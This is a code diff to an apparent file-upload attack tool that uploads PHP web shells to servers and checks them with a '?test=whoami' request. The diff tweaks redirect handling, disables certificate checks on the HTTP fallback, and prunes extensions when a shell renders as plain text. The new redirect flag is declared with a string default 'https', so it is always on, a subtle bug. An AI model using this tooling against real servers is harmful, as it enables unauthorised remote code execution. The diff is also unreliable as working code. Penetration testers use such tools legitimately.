@@ -53,6 +53,7 @@ parser.add_argument("--timeout", action="store_true", dest="timeout", default=20
 parser.add_argument("--print-response", action="store_true", dest="print_response", default=False,help=f"If set, HTTP response will be printed on the screen\nUsage: {blue}--print-response{reset}")
 parser.add_argument("--status-code", type=str, dest="status_codes", default="200",help=f"HTTP status codes which will be treated as acceptable, default 200\nUsage: {blue}--status-code 200,301{reset}")
 parser.add_argument("--protocol", type=str, dest="protocol", default="https",help=f"Connection protocol to be used for uploads, default https\nUsage: {blue}--status-code https{reset}")
+parser.add_argument("--disable-redirects", type=str, dest="disable_redirects", default="https",help=f"If enabled, disables forms from redirecting requests\nUsage: {blue}--disable-redirects{reset}")
 
 options = parser.parse_args()
 
@@ -313,14 +314,14 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
         multipart_data = pattern.sub(f'filename="{file_name}" \nContent-Type: {file_content_type}', data)
 
         try:
-            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=True, verify=True, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
+            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=(not options.disable_redirects), verify=True, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
         except SSLError:
 
             url_http = url.replace('https://', 'http://')  # Change protocol to http
             variations.protocol = "http"
 
             warning(f"SSL error occurred. Switching to HTTP...")  
-            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
+            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=(not options.disable_redirects), verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
             
         if (response.status_code == 404):
             error(f"404 status on requested URL {url}")
@@ -339,7 +340,7 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
     content, headers, host, path = parse_request_file(request_file)
     response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, mimetype)
     if (real_extension != None): file_name = (file_name.split(".")[0]) + real_extension
-    upload_url = f"http://{host}{options.upload_dir}"
+    upload_url = f"{variations.protocol}://{host}{options.upload_dir}"
     if (options.global_verbosity < 2 and message != None): show_progress_bar()
     if (check_success(response)):
         if expect_interaction and message != None: success(message + "\n")
@@ -353,7 +354,12 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
             if (expect_interaction):
                 debug((upload_url + file_name + "?test=whoami"), 0)
                 if (check_result == "printed_out"):
-                    warning("Shell was printed as plain text")
+                    extension = file_name.split(".")[-1]
+                    if (extension in variations.extensions["php"]):
+                        del variations.extensions["php"][variations.extensions["php"].index(extension)]
+                        warning(f"Shell was printed as plain text, removing .{extension} extension")
+                    else:
+                        warning("Shell was printed as plain text")
                 else:
                     warning("Shell does not seem to be interractable, make sure your upload directory is correct")
 
